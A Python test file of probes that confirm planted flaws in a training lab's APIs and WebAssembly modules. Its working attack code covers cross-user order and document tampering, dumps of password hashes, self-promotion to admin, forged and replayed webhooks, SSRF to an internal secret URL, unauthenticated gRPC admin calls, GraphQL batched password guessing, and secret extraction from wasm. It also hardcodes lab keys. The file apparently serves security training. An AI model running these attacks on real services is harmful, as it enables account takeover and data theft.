"""WSTG probes for machine 10 - API Testing + WebAssembly.

Each probe asserts that the intentional weakness is demonstrably present.
Probes create their own users/objects (random suffixes) so re-runs are clean.
"""
import json
import re
import uuid

from labhttp import get, post, request

WASM_API_KEY = "ak_wasm_9d41f0aa77c24e0bb1e6f3c2d8a45b17"
INTERNAL_TOKEN = "itok_6f2b9c44d1ae47e0b83c5f9a2d7e1043"
PW = "Password123!"


def _suffix():
    return uuid.uuid4().hex[:10]


def _register(ctx, prefix):
    uname = f"{prefix}_{_suffix()}"
    r = post(ctx.url("/api/auth/register"), data={"username": uname, "password": PW})
    row = r.json()
    lg = post(ctx.url("/api/auth/login"), data={"username": uname, "password": PW}).json()
    return {"username": uname, "id": row["id"], "token": lg["token"], "row": row}


def _login(ctx, uname, pw):
    return post(ctx.url("/api/auth/login"), data={"username": uname, "password": pw})


def _auth(u):
    return {"Authorization": "Bearer " + u["token"]}


def _gql(ctx, query, token=None):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    return post(ctx.url("/graphql"), data={"query": query}, headers=headers).json()


# --- WSTG-APIT-01  API reconnaissance ----------------------------------------

def apit_01(ctx):
    spec = get(ctx.url("/openapi.json")).json()
    documented = set(spec["paths"])
    routes = get(ctx.url("/debug/routes")).json()
    js = get(ctx.url("/app.js")).text
    js_paths = set(re.findall(r'["\'](/(?:api|v1|v2|graphql|webhooks)[^"\']*)["\']', js))
    catalog = get(ctx.url("/.well-known/api-catalog")).json()
    intro = _gql(ctx, "{__schema{types{name}}}")
    gql_types = [t["name"] for t in intro["data"]["__schema"]["types"] if not t["name"].startswith("__")]

    # hidden legacy endpoint: unauthenticated, absent from the spec, still live
    legacy = get(ctx.url("/api/legacy/orders?order_id=2"))
    legacy_ok = legacy.status == 200 and legacy.json().get("owner_token", "").startswith("ak_bob_")
    # undocumented v2: absent from the spec, still live
    u = _register(ctx, "recon")
    v2 = get(ctx.url("/v2/orders/1"), headers=_auth(u))
    v2_hidden = "/v2/orders/{order_id}" not in documented and v2.status == 200 and "owner" in v2.json()

    ok = (routes["count"] >= 2 * len(documented)
          and "/api/legacy/orders" in catalog.get("legacy_collection", "")
          and "/api/legacy/orders" in js
          and legacy_ok and v2_hidden and len(gql_types) >= 6)
    return ok, (f"openapi={len(documented)} paths vs debug/routes={routes['count']}; "
                f"graphql types={len(gql_types)}; legacy unauth={legacy.status} "
                f"leaks owner_token; undocumented v2 works={v2.status}; js reveals {sorted(js_paths)[:4]}")


# --- WSTG-APIT-02  BOLA -------------------------------------------------------

def apit_02(ctx):
    a, b = _register(ctx, "bola_a"), _register(ctx, "bola_b")
    order = post(ctx.url("/v1/orders"), data={"item": "b-private", "amount": 500}, headers=_auth(b)).json()
    oid = order["id"]
    doc = post(ctx.url("/api/documents"), data={"title": "b-secret", "content": "B confidential notes"},
               headers=_auth(b)).json()

    # path-id BOLA: A reads and modifies B's order
    read = get(ctx.url(f"/v1/orders/{oid}"), headers=_auth(a))
    read_ok = read.status == 200 and read.json()["owner_id"] == b["id"]
    put = request("PUT", ctx.url(f"/v1/orders/{oid}"), data={"status": "hacked-by-A"}, headers=_auth(a))
    put_ok = put.status == 200 and put.json()["status"] == "hacked-by-A"
    confirm = get(ctx.url(f"/v1/orders/{oid}"), headers=_auth(b)).json()["status"] == "hacked-by-A"

    # body-id BOLA: object id supplied in the JSON body
    body = post(ctx.url("/v1/orders/update"), data={"order_id": oid, "status": "body-bola"}, headers=_auth(a))
    body_ok = body.status == 200 and body.json()["status"] == "body-bola"

    # UUID BOLA: uuid leaked by the listing endpoint grants read AND write
    listing = get(ctx.url(f"/api/users/{b['id']}/documents"), headers=_auth(a)).json()
    duuid = next(d["uuid"] for d in listing if d["title"] == "b-secret")
    dread = get(ctx.url(f"/api/documents/{duuid}"), headers=_auth(a))
    dread_ok = dread.status == 200 and dread.json()["content"] == "B confidential notes"
    dput = request("PUT", ctx.url(f"/api/documents/{duuid}"),
                   data={"content": "rewritten by A"}, headers=_auth(a))
    dwrite_ok = dput.status == 200 and get(ctx.url(f"/api/documents/{duuid}"),
                                          headers=_auth(b)).json()["content"] == "rewritten by A"

    ok = read_ok and put_ok and confirm and body_ok and dread_ok and dwrite_ok
    return ok, (f"A read B's order {oid} (owner={b['id']}) + PUT status confirmed by B; "
                f"body order_id BOLA={body_ok}; leaked UUID {duuid[:8]}... read+write={dread_ok and dwrite_ok}")


# --- WSTG-APIT-03  excessive data exposure ------------------------------------

def apit_03(ctx):
    alice = _login(ctx, "alice", PW).json()
    bob = _login(ctx, "bob", PW).json()
    users = get(ctx.url("/api/users"), headers={"Authorization": "Bearer " + alice["token"]}).json()
    bob_row = next(u for u in users if u["username"] == "bob")
    admin_row = next(u for u in users if u["username"] == "admin")
    exposed = {
        "bob_password_hash": bob_row.get("password_hash", "").startswith("pbkdf2$"),
        "bob_api_token": bob_row.get("api_token", "").startswith("ak_bob_"),
        "bob_ssn": bool(bob_row.get("ssn")),
        "admin_hash": admin_row.get("password_hash", "").startswith("pbkdf2$"),
        "internal_notes": "churn risk" in bob_row.get("internal_notes", ""),
    }
    # the UI "protects" these fields purely client-side
    js = get(ctx.url("/app.js")).text
    client_filter = "u.username, email: u.email" in js and "password_hash" not in js
    # undocumented v2 embeds the full owner model
    bob_order = get(ctx.url("/v1/orders"), headers={"Authorization": "Bearer " + bob["token"]}).json()[0]
    v2 = get(ctx.url(f"/v2/orders/{bob_order['id']}"),
             headers={"Authorization": "Bearer " + alice["token"]}).json()
    v2_leak = v2.get("owner", {}).get("password_hash") == bob_row["password_hash"]

    ok = all(exposed.values()) and client_filter and v2_leak
    return ok, (f"raw /api/users exposes {exposed}; UI filters client-side={client_filter}; "
                f"/v2 embeds owner.password_hash={v2_leak}")


# --- WSTG-APIT-04  BFLA -------------------------------------------------------

def apit_04(ctx):
    u, v = _register(ctx, "bfla_u"), _register(ctx, "bfla_v")
    order = post(ctx.url("/v1/orders"), data={"item": "v-order", "amount": 10}, headers=_auth(v)).json()

    admin_list = get(ctx.url("/api/admin/users"), headers=_auth(u))
    read_ok = (admin_list.status == 200 and admin_list.json().get("admin_panel") is True
               and any(x["username"] == "admin" for x in admin_list.json()["users"]))
    # contrast: the pattern guard DOES block POST under /api/admin/ ...
    guarded = post(ctx.url("/api/admin/announce"), data={"message": "hi"}, headers=_auth(u))
    # ... while equivalent admin functions elsewhere sail through
    deleted = request("DELETE", ctx.url(f"/v1/orders/{order['id']}"), headers=_auth(u))
    gone = get(ctx.url(f"/v1/orders/{order['id']}"), headers=_auth(v)).status == 404
    promoted = post(ctx.url(f"/api/users/{u['id']}/role"), data={"role": "admin"}, headers=_auth(u))
    promo_ok = promoted.status == 200 and promoted.json()["is_admin"] == 1

    ok = read_ok and guarded.status == 403 and deleted.status == 200 and gone and promo_ok
    return ok, (f"non-admin GET /api/admin/users={admin_list.status} (full dump); "
                f"guarded POST /api/admin/announce={guarded.status} vs DELETE order={deleted.status} "
                f"(victim sees 404={gone}); self-promotion is_admin={promoted.json().get('is_admin')}")


# --- WSTG-APIT-09  inbound webhooks -------------------------------------------

def apit_09(ctx):
    w, x = _register(ctx, "hook_w"), _register(ctx, "hook_x")
    sample = get(ctx.url("provider") + f"/sample-event?account_id={w['id']}&amount=10").json()
    legit_body, legit_sig = sample["body"], sample["signature"]

    def balance(u):
        return get(ctx.url("/api/me"), headers=_auth(u)).json()["balance"]

    def deliver(body, sig):
        return post(ctx.url("/webhooks/provider"), data=body,
                    headers={"Content-Type": "application/json", "X-Provider-Signature": sig})

    # (a)+(c) forged event: bogus signature, tampered amount - accepted & credited
    forged = json.loads(legit_body)
    forged.update(event_id="evt_forged_" + _suffix(), amount=999999)
    r1 = deliver(json.dumps(forged), "deadbeef" * 8)
    forged_ok = r1.status == 200 and r1.json()["accepted"] and balance(w) == 999999

    # (b) replay: the SAME genuine event delivered twice credits twice
    r2, r3 = deliver(legit_body, legit_sig), deliver(legit_body, legit_sig)
    replay_ok = r2.json()["accepted"] and r3.json()["accepted"] and balance(w) == 999999 + 20

    # (c) cross-tenant: event claims another account, no valid signature
    tampered = json.loads(legit_body)
    tampered.update(event_id="evt_tamper_" + _suffix(), account_id=x["id"], amount=500)
    r4 = deliver(json.dumps(tampered), "0" * 64)
    cross_ok = r4.json()["accepted"] and balance(x) == 500

    # (d) SSRF: receiver fetches an internal-only URL and keeps the response
    ssrf = json.loads(legit_body)
    ssrf.update(event_id="evt_ssrf_" + _suffix(), type="ping", amount=0,
                callback_url="http://internal:8080/latest/secret")
    deliver(json.dumps(ssrf), "0" * 64)
    events = get(ctx.url("/api/webhooks/events"), headers=_auth(w)).json()
    rec = next(e for e in events if e["event_id"] == ssrf["event_id"])
    ssrf_ok = INTERNAL_TOKEN in (rec["callback_response"] or "")

    ok = forged_ok and replay_ok and cross_ok and ssrf_ok
    return ok, (f"forged(amount=999999,bad sig) credited={forged_ok}; replay x2 credited={replay_ok}; "
                f"cross-tenant account {x['id']} balance={balance(x)}; "
                f"SSRF fetched internal metadata token={ssrf_ok}")


# --- WSTG-APIT-10  gRPC -------------------------------------------------------

def apit_10(ctx):
    import grpc  # lazy: only this probe needs the venv deps
    from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
    from google.protobuf import descriptor_pb2, descriptor_pool, message_factory

    channel = grpc.insecure_channel(ctx.endpoints["grpc"])  # plaintext h2c, no creds
    grpc.channel_ready_future(channel).result(timeout=30)
    stub = reflection_pb2_grpc.ServerReflectionStub(channel)

    def reflect(req):
        return next(stub.ServerReflectionInfo(iter([req]), timeout=15))

    services = [s.name for s in reflect(
        reflection_pb2.ServerReflectionRequest(list_services="")).list_services_response.service]
    refl_ok = "lab.Inventory" in services

    fdresp = reflect(reflection_pb2.ServerReflectionRequest(
        file_containing_symbol="lab.Inventory")).file_descriptor_response
    pool = descriptor_pool.DescriptorPool()
    for raw in fdresp.file_descriptor_proto:
        fdp = descriptor_pb2.FileDescriptorProto()
        fdp.ParseFromString(raw)
        pool.Add(fdp)

    def msg(name):
        return message_factory.GetMessageClass(pool.FindMessageTypeByName(name))

    ItemReq, Item = msg("lab.ItemRequest"), msg("lab.Item")
    DumpReq, UserDump = msg("lab.DumpRequest"), msg("lab.UserDump")
    SetStock = msg("lab.SetStockRequest")

    def rpc(method, req_cls, resp_cls):
        return channel.unary_unary(f"/lab.Inventory/{method}",
                                   request_serializer=req_cls.SerializeToString,
                                   response_deserializer=resp_cls.FromString)

    # regular method enforces a token...
    try:
        rpc("GetItem", ItemReq, Item)(ItemReq(id=1), timeout=10)
        blocked = False
    except grpc.RpcError as e:
        blocked = e.code() == grpc.StatusCode.UNAUTHENTICATED
    authed = rpc("GetItem", ItemReq, Item)(
        ItemReq(id=1), metadata=(("x-api-token", "svc-token-alice"),), timeout=10)

    # ...but the admin RPCs enforce nothing: unauthenticated dump + write
    dump = rpc("AdminDumpUsers", DumpReq, UserDump)(DumpReq(), timeout=10)
    hashes = [u.password_hash for u in dump.users if u.password_hash]
    admin_flag = any(u.is_admin for u in dump.users)
    wrote = rpc("AdminSetStock", SetStock, Item)(SetStock(id=1, stock=42), timeout=10)

    channel.close()
    ok = refl_ok and blocked and len(hashes) >= 3 and admin_flag and wrote.stock == 42
    return ok, (f"reflection services={services}; GetItem w/o token=UNAUTHENTICATED({blocked}), "
                f"with token name={authed.name!r}; unauth AdminDumpUsers -> {len(hashes)} password hashes "
                f"(admin flag={admin_flag}); unauth AdminSetStock -> stock={wrote.stock}")


# --- WSTG-APIT-99  GraphQL ----------------------------------------------------

def apit_99(ctx):
    g_, h = _register(ctx, "gql_g"), _register(ctx, "gql_h")
    order = post(ctx.url("/v1/orders"), data={"item": "h-order", "amount": 5}, headers=_auth(h)).json()

    intro = _gql(ctx, "{__schema{queryType{name} mutationType{name} types{name}}}")
    intro_ok = (intro.get("data", {}).get("__schema", {}).get("mutationType") is not None
                and len(intro["data"]["__schema"]["types"]) >= 8)

    # field-level authorization gap: nested user fields expose H's secrets to G
    leak = _gql(ctx, "{ user(id: %d) { username passwordHash apiToken isAdmin } }" % h["id"], g_["token"])
    leak_ok = (leak["data"]["user"]["passwordHash"].startswith("pbkdf2$")
               and leak["data"]["user"]["apiToken"].startswith("ak_"))

    # no depth limit: 9-level cyclic nesting accepted (bounded, no DoS)
    deep_q = ("{ order(id: %d) { owner { orders { owner { orders { owner { orders { owner "
              "{ username } } } } } } } } }" % order["id"])
    deep = _gql(ctx, deep_q, g_["token"])
    node = deep.get("data", {}).get("order", {}).get("owner", {})
    for _ in range(3):  # walk owner -> orders -> owner three more levels down
        node = node.get("orders", [{}])[0].get("owner", {})
    deep_ok = "errors" not in deep and node.get("username") == h["username"]

    # alias-based rate-limit bypass: REST login locks out after 5 failures...
    last = None
    for i in range(6):
        last = _login(ctx, g_["username"], f"wrong-{i}")
    rest_locked = last.status == 429
    # ...while one aliased GraphQL mutation runs 12 guesses + the right password
    aliases = " ".join(
        f'a{i}: login(username: "{g_["username"]}", password: "guess-{i}") {{ token error }}'
        for i in range(12))
    batch = _gql(ctx, 'mutation { %s good: login(username: "%s", password: "%s") { token error } }'
                 % (aliases, g_["username"], PW))
    batch_ok = (rest_locked and batch["data"]["good"]["token"]
                and all(batch["data"][f"a{i}"]["error"] == "bad credentials" for i in range(12)))

    # mutation skips object-level authorization (G edits H's order)
    mut = _gql(ctx, 'mutation { updateOrderStatus(orderId: %d, status: "graphql-bola") '
                    '{ order { id status } error } }' % order["id"], g_["token"])
    mut_ok = mut["data"]["updateOrderStatus"]["order"]["status"] == "graphql-bola"
    # mutation skips function-level authorization (G promotes G)
    promo = _gql(ctx, "mutation { setUserRole(userId: %d, isAdmin: true) { user { isAdmin } error } }"
                 % g_["id"], g_["token"])
    promo_ok = promo["data"]["setUserRole"]["user"]["isAdmin"] is True

    ok = intro_ok and leak_ok and deep_ok and batch_ok and mut_ok and promo_ok
    return ok, (f"introspection={intro_ok}; nested passwordHash/apiToken of user {h['id']} leaked={leak_ok}; "
                f"depth-9 query accepted={deep_ok}; REST locked=429 but 13-alias batch got token={bool(batch_ok)}; "
                f"cross-user mutation={mut_ok}; self-promotion={promo_ok}")


# --- WSTG-WASM-01  WebAssembly reconnaissance ---------------------------------

def _leb(buf, i):
    val, shift = 0, 0
    while True:
        b = buf[i]
        i += 1
        val |= (b & 0x7F) << shift
        if not b & 0x80:
            return val, i
        shift += 7


def _wasm_sections(buf):
    if buf[:4] != b"\x00asm":
        raise ValueError("not a wasm module")
    i, secs = 8, []
    while i < len(buf):
        sid = buf[i]
        i += 1
        size, i = _leb(buf, i)
        secs.append((sid, buf[i:i + size]))
        i += size
    return secs


def _custom_name(payload):
    n, i = _leb(payload, 0)
    return payload[i:i + n].decode("utf-8", "replace")


def _wasm_exports(payload):
    count, i = _leb(payload, 0)
    out = []
    for _ in range(count):
        n, i = _leb(payload, i)
        name = payload[i:i + n].decode("utf-8", "replace")
        i += n
        kind = payload[i]
        i += 1
        _, i = _leb(payload, i)
        out.append((name, kind))
    return out


def _wasm_data_blobs(payload):
    count, i = _leb(payload, 0)
    blobs = []
    for _ in range(count):
        flags, i = _leb(payload, i)
        if flags == 2:                      # active with explicit memidx
            _, i = _leb(payload, i)
        if flags in (0, 2):                 # active: skip offset init expr
            while payload[i] != 0x0B:
                op = payload[i]
                i += 1
                if op in (0x41, 0x23):      # i32.const / global.get
                    _, i = _leb(payload, i)
                elif op not in (0x6A, 0x6B):  # i32.add / i32.sub
                    raise ValueError(f"unexpected init expr opcode {op:#x}")
            i += 1
        size, i = _leb(payload, i)
        blobs.append(payload[i:i + size])
        i += size
    return blobs


def _strings(blobs):
    return [m.decode() for b in blobs for m in re.findall(rb"[\x20-\x7e]{6,}", b)]


def wasm_01(ctx):
    page = get(ctx.url("/")).text
    js = get(ctx.url("/app.js")).text
    # module discovery follows the JS: one .wasm, one disguised lazy-loaded .bin
    mods = re.findall(r'fetch\("([^"]+)"\)', js)
    found = "/license.wasm" in mods and "/telemetry.bin" in mods and "WebAssembly.instantiate" in js

    lic = get(ctx.url("/license.wasm")).body
    secs = _wasm_sections(lic)
    customs = {_custom_name(p): p for sid, p in secs if sid == 0}
    exports = [n for sid, p in secs if sid == 7 for n, k in _wasm_exports(p) if k == 0]
    imports = sum(1 for sid, p in secs if sid == 2)
    data = _strings([p for sid, p in secs if sid == 11])
    name_ok = "name" in customs
    dwarf_ok = any(n.startswith(".debug_info") for n in customs)
    toolchain = b"clang" in customs.get("producers", b"")
    exports_ok = {"validate_license", "get_api_key", "internal_license_checksum"} <= set(exports)
    secrets_ok = (any(WASM_API_KEY in s for s in data)
                  and any("http://internal:8080/latest/secret" in s for s in data)
                  and any("WSTG-M10{wasm_never_hides_secrets}" in s for s in data))

    tele = get(ctx.url("/telemetry.bin")).body
    tsecs = _wasm_sections(tele)
    texports = [n for sid, p in tsecs if sid == 7 for n, k in _wasm_exports(p) if k == 0]
    tdata = _strings([p for sid, p in tsecs if sid == 11])
    tele_ok = "telemetry_tick" in texports and any("grpc:50051" in s for s in tdata)

    src = get(ctx.url("/src/license.c"))
    src_ok = src.status == 200 and WASM_API_KEY in src.text

    ok = found and name_ok and dwarf_ok and toolchain and exports_ok and secrets_ok and tele_ok and src_ok
    return ok, (f"modules={mods}; exports({len(exports)})={exports[:4]}...; name section={name_ok}, "
                f"DWARF={dwarf_ok}, producers=clang:{toolchain}; recovered key={WASM_API_KEY[:16]}... "
                f"+ internal URL from data section; disguised .bin exports={texports}; "
                f"original C source served={src_ok}")